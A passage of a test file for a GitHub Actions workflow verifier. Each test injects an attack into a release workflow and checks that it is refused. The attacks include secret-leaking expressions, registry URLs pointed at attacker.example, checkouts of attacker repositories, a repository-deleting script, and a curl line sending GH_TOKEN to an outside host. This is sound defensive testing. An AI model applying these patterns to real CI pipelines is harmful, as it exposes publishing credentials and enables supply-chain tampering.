      got.join("\n") || "no finding",
    ).toBe(true);
  });
});

describe("expressions are read as GitHub reads them: case-folded, with their strings (round 7)", () => {
  const resolveEnv = (w) => w[P].jobs.setup.steps.find((s) => s.id === "resolve").env;
  it.each(
    ROWS.rows([
      [
        "TOJSON(SECRETS) in upper case",
        (w) => {
          resolveEnv(w).UNIT = "${{ TOJSON(SECRETS) }}";
        },
        /toJSON, fromJSON, format and join are refused/,
      ],
      [
        "SECRETS.X in upper case, outside an environment",
        (w) => {
          resolveEnv(w).UNIT = "${{ SECRETS.GO_TAG_DEPLOY_KEY }}";
        },
        /reads the secrets context outside an environment/,
      ],
      [
        "GITHUB.TOKEN in upper case",
        (w) => {
          resolveEnv(w).UNIT = "${{ GITHUB.TOKEN }}";
        },
        /write the context in lower case/,
      ],
      [
        "a `}}` inside a string hiding toJSON(secrets)",
        (w) => {
          resolveEnv(w).UNIT = "${{ ('}}' && '') || toJSON(secrets) }}";
        },
        /toJSON, fromJSON, format and join are refused/,
      ],
      [
        "a '' escape inside the string",
        (w) => {
          resolveEnv(w).UNIT = "${{ ('it''s }}' && '') || toJSON(secrets) }}";
        },
        /toJSON, fromJSON, format and join are refused/,
      ],
      [
        "a non-ASCII letter (Cyrillic s) in a context name",
        (w) => {
          resolveEnv(w).UNIT = "${{ ѕecrets.X }}";
        },
        /a non-ASCII character in an expression/,
      ],
      [
        "an if: reading SECRETS outside an environment",
        (w) => {
          w[P].jobs.setup.steps.find((s) => s.id === "resolve").if = "contains(SECRETS.X, 'a')";
        },
        /reads the secrets context outside an environment/,
      ],
    ]),
  )("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n") || "no finding",
    ).toBe(true);
  });
  it("a context named only inside a string literal is no read", () =>
    expect(
      added((w) => {
        resolveEnv(w).UNIT = "${{ 'toJSON(secrets) and secrets.X' }}";
      }),
    ).toEqual([]));
  it("splits expressions only outside strings", async () => {
    const { expressionBodies } = await import("./verify-workflows.mjs");
    expect(expressionBodies("a ${{ ('}}' && x) }} b ${{ y }}")).toEqual([" ('}}' && x) ", " y "]);
    expect(expressionBodies("${{ 'it''s }}' }}")).toEqual([" 'it''s }}' "]);
    expect(expressionBodies("${{ unterminated")).toEqual([" unterminated"]);
  });
});

describe("a credential is readable only by a run: block (round 7, HIGH)", () => {
  const upload = (w) => w[C].jobs.upload.steps.find((s) => s.env?.R2_SECRET_ACCESS_KEY);
  it.each(
    ROWS.rows([
      [
        "a step if: leaking a bit of R2_SECRET_ACCESS_KEY",
        (w) => {
          upload(w).if = "${{ startsWith(env.R2_SECRET_ACCESS_KEY, '0') }}";
        },
        /if: .* is not a recorded condition/,
      ],
      [
        "the same if: written bare",
        (w) => {
          upload(w).if = "startsWith(env.R2_SECRET_ACCESS_KEY, '0')";
        },
        /the credential R2_SECRET_ACCESS_KEY is read only by a run: block/,
      ],
      [
        "continue-on-error from a secret",
        (w) => {
          upload(w)["continue-on-error"] = "${{ secrets.R2_SECRET_ACCESS_KEY == 'x' }}";
        },
        /continue-on-error: holds an expression|a secret is read only in an env: value/,
      ],
      [
        "timeout-minutes from a secret",
        (w) => {
          upload(w)["timeout-minutes"] = "${{ secrets.R2_SECRET_ACCESS_KEY }}";
        },
        /timeout-minutes: holds an expression/,
      ],
      [
        "a step name carrying the value",
        (w) => {
          upload(w).name = "Upload ${{ env.R2_SECRET_ACCESS_KEY }}";
        },
        /name: holds an expression/,
      ],
      [
        "a with: carrying a secret",
        (w) => {
          const d = w[C].jobs.upload.steps.find((s) =>
            String(s.uses).startsWith("actions/download-artifact"),
          );
          d.with = { ...d.with, name: "${{ secrets.R2_SECRET_ACCESS_KEY }}" };
        },
        /a secret is read only in an env: value/,
      ],
      [
        "F1 environment.url from a job-level credential",
        (w) => {
          const j = w[C].jobs.upload;
          const s = upload(w);
          j.env = { ...(j.env ?? {}), R2_SECRET_ACCESS_KEY: s.env.R2_SECRET_ACCESS_KEY };
          delete s.env.R2_SECRET_ACCESS_KEY;
          j.environment = {
            name: "cli-release",
            url: "https://example.com/${{ env.R2_SECRET_ACCESS_KEY }}",
          };
        },
        /environment: is a literal name/,
      ],
      [
        "A11/E1 a credential moved to the job env",
        (w) => {
          const j = w[C].jobs.upload;
          const s = upload(w);
          j.env = { ...(j.env ?? {}), R2_SECRET_ACCESS_KEY: s.env.R2_SECRET_ACCESS_KEY };
          delete s.env.R2_SECRET_ACCESS_KEY;
        },
        /the credential R2_SECRET_ACCESS_KEY is set in the job's env/,
      ],
      [
        "a credential set on a step whose run: does not read it",
        (w) => {
          const s = w[P].jobs["publish-go"].steps.find((x) => x.name === "Upload");
          s.env = { ...s.env, DEPLOY_KEY: "${{ secrets.GO_TAG_DEPLOY_KEY }}" };
        },
        /step Upload sets the credential DEPLOY_KEY but its run: does not read it/,
      ],
      [
        "F3 an upper-case if: on the upload step",
        (w) => {
          upload(w).if = "contains(TOJSON(SECRETS), 'a')";
        },
        /is not a recorded condition|toJSON, fromJSON, format and join are refused/,
      ],
      [
        "a job if: reading env",
        (w) => {
          w[P].jobs["publish-npm"].if += " && env.NPM_VERSION != ''";
        },
        /a credentialed job's if: reads more than needs\. and github\./,
      ],
      [
        "a job timeout from an expression",
        (w) => {
          w[P].jobs["publish-npm"]["timeout-minutes"] = "${{ needs.setup.outputs.version }}";
        },
        /a credentialed job's timeout-minutes: holds an expression/,
      ],
    ]),
  )("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n") || "no finding",
    ).toBe(true);
  });
  it("F2: a download-artifact from another run with a secret token stays refused", () => {
    const got = added((w) => {
      const d = w[C].jobs.upload.steps.find((s) =>
        String(s.uses).startsWith("actions/download-artifact"),
      );
      d.with = {
        ...d.with,
        "github-token": "${{ secrets.R2_SECRET_ACCESS_KEY }}",
        repository: "attacker/x",
        "run-id": "1",
      };
    });
    expect(got.some((g) => /downloads an artifact from another run/.test(g))).toBe(true);
    expect(got.some((g) => /a secret is read only in an env: value/.test(g))).toBe(true);
  });
});

describe("each secret name reads its own secret (round 7)", () => {
  it.each(
    ROWS.rows([
      [
        "MAVEN_R2_ACCESS_KEY_ID from another declared secret",
        (w) => {
          w[P].jobs["publish-maven"].steps.find(
            (s) => s.name === "Upload",
          ).env.MAVEN_R2_ACCESS_KEY_ID = "${{ secrets.MAVEN_R2_SECRET_ACCESS_KEY }}";
        },
        /MAVEN_R2_ACCESS_KEY_ID is .*, not its pinned expression/,
      ],
      [
        "the Go DEPLOY_KEY from the mirrors' secret",
        (w) => {
          w[P].jobs["publish-go"].steps.find(
            (s) => s.name === "Install the deploy key",
          ).env.DEPLOY_KEY = "${{ secrets.MIRROR_DEPLOY_KEY }}";
        },
        /DEPLOY_KEY is \$\{\{ secrets\.MIRROR_DEPLOY_KEY \}\}, not its pinned expression/,
      ],
      [
        "another known host",
        (w) => {
          w[P].env.GITHUB_SSH_KNOWN_HOST = "github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVIL";
        },
        /GITHUB_SSH_KNOWN_HOST is .*, not its pinned expression/,
      ],
    ]),
  )("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n") || "no finding",
    ).toBe(true);
  });
});

describe("17 every credentialed job's action surface is frozen (round 8)", () => {
  const P_ = "sdk-publish.yml";
  const j = (w, f, id) => w[f].jobs[id];
  const S = (w, f, id, pred) => j(w, f, id).steps.find(pred);
  const uses = (prefix) => (s) => String(s.uses).startsWith(prefix);
  const SURFACE = /ACTION_SURFACE records/;
  it.each(
    ROWS.rows([
      [
        "C1 pypi repository-url to an attacker",
        (w) => {
          S(w, P_, "publish-pypi", uses("pypa/")).with["repository-url"] =
            "https://attacker.example/legacy/";
        },
        SURFACE,
      ],
      [
        "C2 rubygems gem-server to an attacker",
        (w) => {
          const s = S(w, P_, "publish-rubygems", uses("rubygems/"));
          s.with = { ...(s.with ?? {}), "gem-server": "https://attacker.example" };
        },
        SURFACE,
      ],
      [
        "C2b rubygems audience override",
        (w) => {
          const s = S(w, P_, "publish-rubygems", uses("rubygems/"));
          s.with = { ...(s.with ?? {}), audience: "attacker.example" };
        },
        SURFACE,
      ],
      [
        "C3 maven checkout of another repository",
        (w) => {
          const s = S(w, P_, "publish-maven", uses("actions/checkout"));
          s.with.repository = "attacker/evil";
          s.with.ref = "main";
        },
        SURFACE,
      ],
      [
        "C4 cli upload checkout of another repository",
        (w) => {
          S(w, C, "upload", uses("actions/checkout")).with.repository = "attacker/evil";
        },
        SURFACE,
      ],
      [
        "C4b cli promote checkout of a pull request",
        (w) => {
          S(w, C, "promote", uses("actions/checkout")).with.ref = "refs/pull/1/head";
        },
        SURFACE,
      ],
      [
        "C5 crates checkout of a pull request",
        (w) => {
          S(w, P_, "publish-crates", uses("actions/checkout")).with.ref = "refs/pull/1/head";
        },
        SURFACE,
      ],
      [
        "C6 pypa inside the NuGet job, with its key",
        (w) => {
          const st = j(w, P_, "publish-nuget").steps;
          st.splice(st.findIndex((s) => s.id === "login") + 1, 0, {
            name: "inj",
            uses: "pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33",
            with: {
              "repository-url": "https://attacker.example/legacy/",
              user: "x",
              password: "${{ steps.login.outputs.NUGET_API_KEY }}",
              "packages-dir": "release/",
            },
          });
        },
        SURFACE,
      ],
      [
        "C6b a checkout with the crates token",
        (w) => {
          j(w, P_, "publish-crates").steps.push({
            name: "inj",
            uses: "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
            with: {
              "persist-credentials": false,
              repository: "attacker/evil",
              token: "${{ steps.auth.outputs.token }}",
            },
          });
        },
        /credential output of rust-lang\/crates-io-auth-action is read only in an env: value/,
      ],
      [
        "C7 maven attestation subject forged",
        (w) => {
          S(w, P_, "publish-maven", uses("actions/attest")).with = {
            "subject-name": "pkg:maven/io.confeature/sdk@9.9.9",
            "subject-digest": `sha256:${"a".repeat(64)}`,
          };
        },
        SURFACE,
      ],
      [
        "C7b maven attestation pushed to a registry",
        (w) => {
          const s = S(w, P_, "publish-maven", uses("actions/attest"));
          s.with = { ...s.with, "push-to-registry": true, "subject-name": "ghcr.io/attacker/x" };
        },
        SURFACE,
      ],
      [
        "C11 setup-node's registry-url to an attacker",
        (w) => {
          S(w, P_, "publish-npm", uses("actions/setup-node")).with["registry-url"] =
            "https://attacker.example/";
        },
        SURFACE,
      ],
      [
        "C12 download-artifact of every artifact of the run",
        (w) => {
          S(w, P_, "publish-maven", uses("actions/download-artifact")).with = {
            pattern: "*",
            "merge-multiple": true,
            path: "release",
          };
        },
        SURFACE,
      ],
      [
        "C13 pypi packages-dir /",
        (w) => {
          S(w, P_, "publish-pypi", uses("pypa/")).with["packages-dir"] = "/";
        },
        SURFACE,
      ],
      [
        "C14 NuGet login user from the event",
        (w) => {
          S(w, P_, "publish-nuget", (s) => s.id === "login").with.user =
            "${{ github.event.head_commit.author.name }}";
        },
        SURFACE,
      ],
      [
        "C17 a credentialed job's continue-on-error: true",
        (w) => {
          j(w, P_, "publish-go")["continue-on-error"] = true;
        },
        /continue-on-error/,
      ],
      [
        "C18 crates-io-auth-action url to an attacker",
        (w) => {
          S(w, P_, "publish-crates", (s) => s.id === "auth").with = {
            url: "https://attacker.example",
          };
        },
        SURFACE,
      ],
      [
        "C19 NuGet/login token-service-url to an attacker",
        (w) => {
          const s = S(w, P_, "publish-nuget", (s) => s.id === "login");
          s.with = { ...s.with, "token-service-url": "https://attacker.example/token" };
        },
        SURFACE,
      ],
      [
        "D4 the NuGet key as a download-artifact name",
        (w) => {
          j(w, P_, "publish-nuget").steps.push({
            name: "inj",
            uses: "actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093",
            with: { name: "${{ steps.login.outputs.NUGET_API_KEY }}", path: "release" },
          });
        },
        /credential output of NuGet\/login is read only in an env: value/,
      ],
      [
        "an action step removed",
        (w) => {
          const st = j(w, P_, "publish-pypi").steps;
          st.splice(st.findIndex(uses("pypa/")), 1);
        },
        SURFACE,
      ],
      [
        "an id changed",
        (w) => {
          S(w, P_, "publish-nuget", (s) => s.id === "login").id = "other";
        },
        SURFACE,
      ],
      [
        "D2 a credential on a step that reads it only in a comment",
        (w) => {
          const s = j(w, P_, "publish-go").steps.find(
            (x) => x.name === "Ask the Go proxy for the release",
          );
          s.env = { ...(s.env ?? {}), DEPLOY_KEY: "${{ secrets.GO_TAG_DEPLOY_KEY }}" };
          s.run = `# \${DEPLOY_KEY}\n${s.run}`;
        },
        /sets the credential DEPLOY_KEY but its run: does not read it/,
      ],
    ]),
  )("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n") || "no finding",
    ).toBe(true);
  });
  it("C15 (control): a job name reading a setup output is accepted", () =>
    expect(
      added((w) => {
        j(w, P_, "publish-go").name = "x ${{ needs.setup.outputs.name }}";
      }),
    ).toEqual([]));
  it("verifyWorkflows runs rule 17 on a copy of the repository", () => {
    const dir = mkdtempSync(join(tmpdir(), "release-workflows-"));
    try {
      for (const rel of [SETTINGS, MANIFEST, WORKFLOWS])
        cpSync(join(ROOT, rel), join(dir, rel), { recursive: true });
      const f = join(dir, WORKFLOWS, P_);
      writeFileSync(
        f,
        readFileSync(f, "utf8").replace(
          "packages-dir: release/",
          "packages-dir: release/\n          repository-url: https://attacker.example/legacy/",
        ),
      );
      expect(verifyWorkflows(dir).map((x) => x.why)).toContainEqual(
        expect.stringMatching(/ACTION_SURFACE records/),
      );
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
  // #868: a local action is frozen by its action.yml's bytes.
  it.each([
    ["changed", (y) => `${y}# one more line\n`],
    ["missing", () => undefined],
  ])("refuses the frozen jobs' Dagger setup action when its action.yml is %s", (_n, edit) => {
    const actions = { ...ACTIONS, [DAGGER_SETUP.uses]: edit(ACTIONS[DAGGER_SETUP.uses]) };
    const got = surfaceFindings(BASE, ACTION_SURFACE, actions).map(
      (f) => `${f.file}: ${f.job}: ${f.why}`,
    );
    for (const where of ["release-gate.yml: test: step 2", "sdk-publish.yml: gate: action 2"])
      expect(
        got.some((g) => g.startsWith(where) && g.includes("./.github/actions/dagger-setup")),
        got.join("\n"),
      ).toBe(true);
  });
  it("records the setup action's real bytes", () =>
    expect(surfaceFindings(BASE, ACTION_SURFACE, ACTIONS)).toEqual([]));
  it("refuses a recorded job the workflow no longer has", () =>
    expect(
      surfaceFindings({
        "sdk-publish.yml": { jobs: {} },
        "cli-release.yml": { jobs: {} },
        "release-gate.yml": { jobs: {} },
      }).map((f) => f.why),
    ).toContainEqual("ACTION_SURFACE records a job the workflow does not have"));
});

describe("a step output is written by the command that redirects it (round 8, F6)", () => {
  it.each([
    ['echo "sha256=$(sha256sum x | cut -d" " -f1)" >> "$GITHUB_OUTPUT"', true],
    ['{ echo "sums<<SUMS"; sha256sum -- *; echo "SUMS"; } >> "$GITHUB_OUTPUT"', true],
    ['echo "file=${file}" >> "$GITHUB_OUTPUT"', true],
    ['echo "sha256=" >/dev/null; printf "%s\\n" x >> "$GITHUB_OUTPUT"', false],
    ['echo "sha256=" && echo x >> "$GITHUB_OUTPUT"', false],
    ['# echo "sha256=x" >> "$GITHUB_OUTPUT"', false],
    ['echo "x sha256=y" >> "$GITHUB_OUTPUT"', false],
    ['{ echo x; echo "sha256=y"; } >> "$GITHUB_OUTPUT"', false],
    ['echo "sha256=y" >> "$GITHUB_STEP_SUMMARY"', false],
    // round 9: the group's brace is the group's, never the `{` of `${file}`
    ['x=1; { echo "file=${file}"; echo y; } >> "$GITHUB_OUTPUT"', true],
    ['x=1; { echo y; echo "file=${file}"; } >> "$GITHUB_OUTPUT"', false],
    ['echo "${file}"; { echo "file=y"; } >> "$GITHUB_OUTPUT"', true],
    ['echo "file=${file}"; { echo y; } >> "$GITHUB_OUTPUT"', false],
    ['echo x; { echo y; echo file=${file}; } >> "$GITHUB_OUTPUT"', false],
    ['x=1; { echo file=${file}; echo y; } >> "$GITHUB_OUTPUT"', true],
  ])("%s writes sha256: %s", async (line, want) => {
    const { writesOutput } = await import("./verify-workflows.mjs");
    expect(
      writesOutput(
        line,
        line.includes("sums<<") ? "sums" : line.includes("file=") ? "file" : "sha256",
      ),
    ).toBe(want);
  });
  it("D1: a decoy beside the real write is refused in the real workflow", () => {
    const w = structuredClone(BASE);
    const s = w[P].jobs["pack-npm"].steps.find((x) => x.id === "digest");
    s.run = `${s.run
      .split("\n")
      .filter((l) => !/sha256=/.test(l))
      .join("\n")}\necho "sha256=" >/dev/null; printf "%s\\n" x >> "$GITHUB_OUTPUT"\n`;
    expect(referenceFindings(w, SCRIPTS, settings).map((f) => f.why)).toContainEqual(
      expect.stringMatching(/step digest writes no sha256= to \$GITHUB_OUTPUT/),
    );
  });
});

describe("CREDENTIAL_ENV is an explicit, complete list (round 8)", () => {
  it("names exactly these credentials", () =>
    expect([...CREDENTIAL_ENV].sort()).toEqual([
      "CARGO_REGISTRY_TOKEN",
      "CLOUDFLARE_ACCOUNT_ID",
      "DEPLOY_KEY",
      "GH_TOKEN",
      "MAVEN_R2_ACCESS_KEY_ID",
      "MAVEN_R2_SECRET_ACCESS_KEY",
      "NUGET_API_KEY",
      "R2_ACCESS_KEY_ID",
      "R2_SECRET_ACCESS_KEY",
    ]));
  // Every credentialed job of the release workflows, read from the workflows
  // themselves (round 9: a hand-kept list missed cli-release's release job).
  const CREDENTIALED = [P, C].flatMap((f) =>
    Object.entries(BASE[f].jobs)
      .filter(([id, job]) => isCredentialed(f, id, job, BASE[f]))
      .map(([id]) => id),
  );
  it("derives its credentialed jobs from the workflows, cli-release's release job among them", () => {
    expect(CREDENTIALED).toEqual(expect.arrayContaining(["publish-npm", "upload", "release"]));
    for (const id of CREDENTIALED)
      expect(Object.keys(ACTION_SURFACE[P]).concat(Object.keys(ACTION_SURFACE[C]))).toContain(id);
  });
  it("holds every PINNED_ENV name pinned to secrets.*, steps.* or github.token, for every credentialed job", () => {
    for (const [name, pin] of Object.entries(PINNED_ENV))
      for (const j of CREDENTIALED)
        if (/secrets|steps|github\\?\.token/.test(pin(j).source))
          expect(CREDENTIAL_ENV.has(name), `${name} (${j})`).toBe(true);
  });
  it("checks GH_TOKEN, pinned to github.token, on the release job", () =>
    expect(PINNED_ENV.GH_TOKEN("release").test("${{ github.token }}")).toBe(true));
  it("a job with no recorded deploy key accepts none", () => {
    expect(PINNED_ENV.DEPLOY_KEY("publish-npm").test("${{ secrets.MIRROR_DEPLOY_KEY }}")).toBe(
      false,
    );
    expect(
      PINNED_ENV.DEPLOY_KEY("publish-npm").test("${{ secrets.NO_DEPLOY_KEY_FOR_THIS_JOB }}"),
    ).toBe(false);
  });
});

describe("the write token, the build and every job's surface (round 9)", () => {
  const P_ = "sdk-publish.yml";
  const j = (w, f, id) => w[f].jobs[id];
  const S = (w, f, id, pred) => j(w, f, id).steps.find(pred);
  const U = (prefix) => (s) => String(s.uses).startsWith(prefix);
  const GS = "actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b";
  const ghStep = (w) => j(w, C, "release").steps.find((s) => s.env?.GH_TOKEN);
  const SURFACE = /ACTION_SURFACE records/;
  const COE = /continue-on-error/;
  it.each(
    ROWS.rows([
      [
        "X1 release: a checkout of another repository",
        (w) => {
          S(w, C, "release", U("actions/checkout")).with.repository = "attacker/evil";
        },
        SURFACE,
      ],
      [
        "X1b build: a checkout of another repository",
        (w) => {
          S(w, C, "build", U("actions/checkout")).with.repository = "attacker/evil";
        },
        SURFACE,
      ],
      [
        "X2 release: a checkout of a pull request",
        (w) => {
          S(w, C, "release", U("actions/checkout")).with.ref = "refs/pull/1/head";
        },
        SURFACE,
      ],
      [
        "X3 release: github-script with the contents: write token",
        (w) => {
          j(w, C, "release").steps.splice(2, 0, {
            name: "x",
            uses: GS,
            with: {
              script:
                "await github.rest.git.createRef({owner:'confeature',repo:'sdks',ref:'refs/tags/sdk-go-v9.9.9',sha:context.sha})",
            },
          });
        },
        SURFACE,
      ],
      [
        "X3b release: a checkout keeping the token",
        (w) => {
          Object.assign(S(w, C, "release", U("actions/checkout")).with, {
            "persist-credentials": true,
            token: "${{ github.token }}",
          });
        },
        SURFACE,
      ],
      [
        "X4 build: setup-deno's version from the event",
        (w) => {
          S(w, C, "build", U("denoland/")).with["deno-version"] =
            "${{ github.event.head_commit.message }}";
        },
        SURFACE,
      ],
      [
        "X5 release: a local action",
        (w) => {
          j(w, C, "release").steps.splice(2, 0, { name: "x", uses: "./.github/actions/x" });
        },
        /runs no local or container action/,
      ],
      [
        "X5b release: a container action",
        (w) => {
          j(w, C, "release").steps.splice(2, 0, { name: "x", uses: "docker://alpine:3" });
        },
        /runs no local or container action/,
      ],
      [
        "X5c build: the artifact path widened",
        (w) => {
          S(w, C, "build", U("actions/upload-artifact")).with.path =
            "apps/cli/dist/\n/home/runner/work/\n";
        },
        SURFACE,
      ],
      [
        "X7 pack-npm: a checkout of another repository",
        (w) => {
          S(w, P_, "pack-npm", U("actions/checkout")).with.repository = "attacker/evil";
        },
        SURFACE,
      ],
      [
        "X8 pack-npm: a checkout of a pull request",
        (w) => {
          S(w, P_, "pack-npm", U("actions/checkout")).with.ref = "refs/pull/1/head";
        },
        SURFACE,
      ],
      [
        "X8b pack-npm: setup-node's version from the event",
        (w) => {
          S(w, P_, "pack-npm", U("actions/setup-node")).with["node-version"] =
            "${{ github.event.head_commit.message }}";
        },
        SURFACE,
      ],
      [
        "setup: a checkout of a pull request",
        (w) => {
          S(w, P_, "setup", U("actions/checkout")).with.ref = "refs/pull/1/head";
        },
        SURFACE,
      ],
      [
        "X26 release: curl of GH_TOKEN in the gh step",
        (w) => {
          ghStep(w).run += '\ncurl -d "$GH_TOKEN" https://a.example\n';
        },
        /credential GH_TOKEN outside its recorded position|curl is not a command/,
      ],
      [
        "X26b release: GH_TOKEN written to a file",
        (w) => {
          ghStep(w).run += '\nprintf "%s" "$GH_TOKEN" > publish-tmp/t\n';
        },
        /credential GH_TOKEN outside its recorded position/,
      ],
      [
        "X27 release: GH_TOKEN on the digest step",
        (w) => {
          const s = j(w, C, "release").steps.find((x) => /build job's digest/.test(x.name ?? ""));
          s.env = { ...(s.env ?? {}), GH_TOKEN: "${{ github.token }}" };
        },
        /sets the credential GH_TOKEN but its run: does not read it/,
      ],
      [
        "X27b build: GH_TOKEN on the compile step makes it credentialed",
        (w) => {
          const s = S(w, C, "build", (x) => x.name === "Compile all targets");
          s.env = { GH_TOKEN: "${{ github.token }}" };
        },
        /build step Compile all targets: a credentialed job runs `deno task compile`: deno is not a command a credentialed job runs/,
      ],
      [
        "X28 nuget: a digest check with continue-on-error",
        (w) => {
          S(w, P_, "publish-nuget", (s) => /digest/i.test(s.name ?? ""))["continue-on-error"] =
            true;
        },
        COE,
      ],
      [
        "X28b npm: every run step with continue-on-error",
        (w) => {
          for (const s of j(w, P_, "publish-npm").steps) if (s.run) s["continue-on-error"] = true;
        },
        COE,
      ],
      [
        "X14 maven: the attestation with continue-on-error",
        (w) => {
          S(w, P_, "publish-maven", U("actions/attest"))["continue-on-error"] = true;
        },
        COE,
      ],
      [
        "X31 build: setup-deno with an env",
        (w) => {
          S(w, C, "build", U("denoland/")).env = { DENO_CERT: "/tmp/x" };
        },
        SURFACE,
      ],
      [
        "X33 workflow-rules: its steps with continue-on-error",
        (w) => {
          for (const s of j(w, P_, "workflow-rules").steps)
            if (s.run) s["continue-on-error"] = true;
        },
        COE,
      ],
      [
        "X34 build: the on-main check with continue-on-error",
        (w) => {
          S(w, C, "build", (s) => /not on main/.test(s.name ?? ""))["continue-on-error"] = true;
        },
        COE,
      ],
      [
        "X35 publish-go: its guards with continue-on-error",
        (w) => {
          for (const s of j(w, P_, "publish-go").steps) if (s.run) s["continue-on-error"] = true;
        },
        COE,
      ],
      [
        "17 two recorded steps swapped",
        (w) => {
          const st = j(w, P_, "pack-npm").steps;
          const a = st.findIndex(U("pnpm/"));
          const b = st.findIndex(U("actions/setup-node"));
          [st[a], st[b]] = [st[b], st[a]];
        },
        SURFACE,
      ],
      [
        "17 a recorded with: key removed",
        (w) => {
          delete S(w, P_, "publish-pypi", U("pypa/")).with["packages-dir"];
        },
        SURFACE,
      ],
      [
        "17 another SHA at the same position",
        (w) => {
          const s = S(w, P_, "publish-npm", U("actions/setup-node"));
          s.uses = s.uses.replace(/@[0-9a-f]+$/, `@${"0".repeat(40)}`);
        },
        SURFACE,
      ],
      [
        "17 a job ACTION_SURFACE does not record",
        (w) => {
          w[P_].jobs["pack-extra"] = structuredClone(w[P_].jobs["pack-npm"]);
        },
        /a job ACTION_SURFACE does not record/,
      ],
      [
        "17 release-gate: the follow-up script changed",
        (w) => {
          S(w, "release-gate.yml", "test", U("actions/github-script")).with.script +=
            "\nawait github.rest.repos.delete(context.repo);";
        },
        SURFACE,
      ],
      [
        "18 verify.yml granted contents: write",
        (w) => {
          const k = Object.keys(w["verify.yml"].jobs)[0];
          w["verify.yml"].jobs[k].permissions = { contents: "write" };
        },
        /verify\.yml: verify: grants write on \[contents\], WRITE_PERMISSIONS records \[\]/,
      ],
      [
        "18 cli-windows-install-verify.yml granted write-all",
        (w) => {
          w["cli-windows-install-verify.yml"].permissions = "write-all";
        },
        /at the workflow level/,
      ],
      [
        "18 release-gate's issues: write moved to the workflow",
        (w) => {
          w["release-gate.yml"].permissions = { contents: "read", issues: "write" };
        },
        /issues write at the workflow level/,
      ],
      [
        "18 a publish job asking for contents: write too",
        (w) => {
          j(w, P_, "publish-npm").permissions["contents"] = "write";
        },
        /WRITE_PERMISSIONS records \[id-token\]/,
      ],
      [
        "18 cli-windows-install-verify granted id-token",
        (w) => {
          const k = Object.keys(w["cli-windows-install-verify.yml"].jobs)[0];
          w["cli-windows-install-verify.yml"].jobs[k].permissions = { "id-token": "write" };
        },
        /cli-windows-install-verify\.yml: verify-windows-install: grants write on \[id-token\], WRITE_PERMISSIONS records \[\]/,
      ],
    ]),
  )("refuses %s", (label, mutate, why) => {
    const got = added(mutate);
    expectFindings(label, got);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n") || "no finding",
    ).toBe(true);
  });
});

describe("credential outputs are split from the outputs an action offers (round 9)", () => {
  const doc = {
    jobs: {
      j: {
        steps: [
          { id: "a", uses: "x/attest@0123" },
          { name: "use", run: "true", env: { V: "${{ steps.a.outputs.url }}" } },
        ],
      },
    },
  };
  const ask = (credentialOutputs, inEnv) =>
    referenceProblem("steps.a.outputs.url", {
      doc,
      jobId: "j",
      step: doc.jobs.j.steps[1],
      inEnv,
      actionOutputs: { "x/attest": ["url"] },
      credentialOutputs,
    });
  it("a non-credential output is readable outside an env: value", () =>
    expect(ask({}, false)).toBe(null));
  it("a credential output is read in an env: value only", () => {
    expect(ask({ "x/attest": ["url"] }, false)).toMatch(/read only in an env: value/);
    expect(ask({ "x/attest": ["url"] }, true)).toBe(null);
  });
  it("an output no action offers is a missing reference", () =>
    expect(
      referenceProblem("steps.a.outputs.nope", {
        doc,
        jobId: "j",
        step: doc.jobs.j.steps[1],
        inEnv: true,
        actionOutputs: { "x/attest": ["url"] },
        credentialOutputs: {},
      }),
    ).toMatch(/offers no recorded output nope/));
  it("every credential output is an offered output", () => {
    for (const [repo, outs] of Object.entries(CREDENTIAL_ACTION_OUTPUTS))
      expect(ACTION_OUTPUTS[repo], repo).toEqual(expect.arrayContaining(outs));
  });
});

describe("the rule list reads in order (round 9)", () => {
  it("numbers verify-workflows.mjs's rules 1, 2, … in order", () => {
    const head = readFileSync(join(ROOT, "tools/repo-gates/verify-workflows.mjs"), "utf8").split(
      "*/",
    )[0];
    const nums = [...head.matchAll(/^ \*\s+(\d+)\. [A-Z]/gm)].map((m) => Number(m[1]));
    expect(nums).toEqual(nums.map((_, i) => i + 1));
    expect(nums.length).toBeGreaterThanOrEqual(18);
  });
});

describe("every CLI job that publishes re-checks the tag is on main (round 10, MED-1)", () => {
  const guard = (w, job) =>
    w[C].jobs[job].steps.find((s) => s.name === "Refuse a tag that is not on main");
  const at = (w, job) => w[C].jobs[job].steps.indexOf(guard(w, job));
  const SURFACE = /ACTION_SURFACE records/;
  const rows = [];
  for (const job of ["build", "release", "upload"])
    rows.push(
      [
        `B1 ${job}: the on-main step deleted`,
        (w) => void w[C].jobs[job].steps.splice(at(w, job), 1),
        /runs \d+ steps, ACTION_SURFACE records \d+/,
      ],
      [
        `B2 ${job}: the on-main step with if: false`,
        (w) => void (guard(w, job).if = "false"),
        SURFACE,
      ],
      [
        `B3 ${job}: the on-main run replaced with true`,
        (w) => void (guard(w, job).run = "true\n"),
        SURFACE,
      ],
      [
        `B4 ${job}: the on-main run with || true`,
        (w) => void (guard(w, job).run = "bash apps/cli/scripts/check-on-main.sh || true"),
        SURFACE,
      ],
      [
        `B4b ${job}: the on-main step moved after the download`,
        (w) => {
          const st = w[C].jobs[job].steps;
          const [g] = st.splice(at(w, job), 1);
          st.splice(st.length - 1, 0, g);
        },
        SURFACE,
      ],
      [
        `B4c ${job}: a shallow checkout (no origin/main to check against)`,
        (w) => void (w[C].jobs[job].steps[0].with["fetch-depth"] = 1),
        SURFACE,
      ],
    );
  rows.push(
    [
      "B5 build: job-level continue-on-error",
      (w) => void (w[C].jobs.build["continue-on-error"] = true),
      /build: sets continue-on-error: \(its failure would be reported green\)/,
    ],
    [
      "B5b release: job-level continue-on-error",
      (w) => void (w[C].jobs.release["continue-on-error"] = true),
      /release: sets continue-on-error:/,
    ],
    [
      "B5c release-gate test: job-level continue-on-error",
